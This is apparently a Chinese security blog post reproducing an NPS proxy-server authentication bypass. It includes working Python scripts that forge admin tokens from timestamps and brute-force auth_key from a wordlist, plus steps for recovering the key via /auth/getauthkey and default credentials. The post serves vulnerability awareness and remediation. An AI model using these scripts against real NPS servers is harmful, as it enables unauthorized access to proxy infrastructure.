## 0x01简介

NPS是一款轻量级、高性能、功能强大的内网渗透代理服务器，具有强大的Web管理终端。在红蓝队攻防战经常被用来进行内网穿透，流量代理。相比较frp、sockets等代理工具来说NPS有web界面可以更方便的对代理进行管理，深受网络安全人员的喜爱。

在2022年8月份左右，NPS爆出了当用户使用默认配置，未配置auth_key参数时攻击者可以利用时间戳直接伪造管理员token的漏洞。但这个漏洞修复还有些需要注意的地方，请往下看。

## 0x02复现

1.搭建NPS服务器，在/etc/nps/nps.conf的配置文件使用默认配置文件。注意这里auth_key被注释，auth_crypt_key为默认值。![1691741982_64d5ef1e9177eaf742bf8.png!small?1691741981286](https://image.3001.net/images/20230811/1691741982_64d5ef1e9177eaf742bf8.png!small?1691741981286)

  

2.访问网站，这里还有个漏洞要注意，nps的默认账号为admin密码为123。所以请不要忘记更改密码。

![1691742020_64d5ef448e3480cb00e3b.png!small?1691742019323](https://image.3001.net/images/20230811/1691742020_64d5ef448e3480cb00e3b.png!small?1691742019323)

3.运行以下脚本就可以获得NPS里的代理信息，其中打印出来的链接可以直接粘贴到nps的url后面进入后台。

    
    
    import timeimport  requestsimport hashlibnow = time.time()m = hashlib.md5()m.update(str(int(now)).encode("utf8"))auth_key = m.hexdigest()datas = {'search':"","order":"asc","offset":0,"limit":10,'auth_key': auth_key,'timestamp':int(now)}print("/index/index?auth_key={0}&amptimestamp={1}".format(auth_key,int(now)))headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"}response=requests.post("http://192.168.221.130:8080/client/list",data=datas,headers=headers, allow_redirects=False)print(response.status_code)print(response.text)

![1691742306_64d5f062362478d195eac.png!small](https://image.3001.net/images/20230811/1691742306_64d5f062362478d195eac.png!small)

![1691742354_64d5f09241d577a97afbd.png!small](https://image.3001.net/images/20230811/1691742354_64d5f09241d577a97afbd.png!small)

## 0x03进阶

该漏洞修复方式是注释掉auth_crypt_key,并修改auth_key的值为随机值，但很多开发者并不会给auth_key设置为随机值，导致攻击者可以爆破该值拼接到时间戳上md5来触发此漏洞。

1.这里我将auth_crypt_key注释掉，修改auth_key的值为test，因为官方默认auth_key的值就是test，如果开发者只是删除了前方的注释，则值为test。

![1691742417_64d5f0d192417ba2dd985.png!small?1691742416334](https://image.3001.net/images/20230811/1691742417_64d5f0d192417ba2dd985.png!small?1691742416334)

2.但还有很多情况下开发者自己配置了auth_key所以我们修改脚本对auth_key的值进行爆破。如果秘钥正确，也可以利用该漏洞。

    
    
    import timeimport  requestsimport hashlibwith open(r"E:\tools\password\100.txt",encoding="utf8") as f:for cs in f.readlines():now = time.time()m = hashlib.md5()cs=cs.replace("\n","").strip()m.update(cs.encode()+str(int(now)).encode("utf8"))auth_key = m.hexdigest()datas = {'search':"","order":"asc","offset":0,"limit":10,'auth_key': auth_key,'timestamp':int(now)}headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"}response=requests.post("http://192.168.221.130:8080/client/list",data=datas,headers=headers, allow_redirects=False)print(cs)print(response.status_code)if(response.status_code==200):print("/index/index?auth_key={0}&amptimestamp={1}".format(auth_key, int(now)))print(response.text)break

![1691742453_64d5f0f5b52dacdbfafd5.png!small?1691742452678](https://image.3001.net/images/20230811/1691742453_64d5f0f5b52dacdbfafd5.png!small?1691742452678)

还有种情况就是开发者同时设置了auth_crypt_key和auth_key，此时可以通过访问/auth/getauthkey接口获取到加密的auth_key但是需要猜到auth_crypt_key的值才能解出正确的auth_key。

所以同样的，这种情况下可以对auth_crypt_key的值进行爆破，但需要注意一般auth_crypt_key的值都是16位数，默认是1234567812345678。有正确的auth_crypt_key后就可以对访问/auth/getauthkey的接口获得的秘钥进行AES
CBC PK7解密，之后的利用过程就和上面一样。

1.NPS如下配置。

![1691742505_64d5f129e943b320d7aa9.png!small?1691742504646](https://image.3001.net/images/20230811/1691742505_64d5f129e943b320d7aa9.png!small?1691742504646)

2.访问/auth/getauthkey接口获取加密的后的auth_key。

![1691742526_64d5f13e4a39fad6f8231.png!small?1691742525016](https://image.3001.net/images/20230811/1691742526_64d5f13e4a39fad6f8231.png!small?1691742525016)

3.对7831xxxx进行解密，秘钥和IV为你猜测的auth_crypt_key，AES解密，可以看到顺利解出了auth_key。如果你没解出来，大概率是你猜测的秘钥不对。

![1691742551_64d5f15709be222335d17.png!small?1691742549836](https://image.3001.net/images/20230811/1691742551_64d5f15709be222335d17.png!small?1691742549836)

4.和之前一样，将auth_key和时间戳拼接md5后既可利用该漏洞。

![1691742567_64d5f16756d34fe1967ba.png!small?1691742566072](https://image.3001.net/images/20230811/1691742567_64d5f16756d34fe1967ba.png!small?1691742566072)

![1691742575_64d5f16f9718ebd8a1cbe.png!small?1691742574599](https://image.3001.net/images/20230811/1691742575_64d5f16f9718ebd8a1cbe.png!small?1691742574599)

## 0x04结语

很多开发者按照互联网的教程，注释掉或者修改auth_crypt_key值就以为修复该漏洞了。但其实这些值如果是默认值或者弱口令攻击者很方便就可以爆破出你的auth_key，导致漏洞依然存在。

创作不易，转载请注明出处。该文章主要用来协助开发者排查漏洞，请勿用于非法用途。

更多漏洞详解微信搜索公众号"地表最强伍迪哥"

  

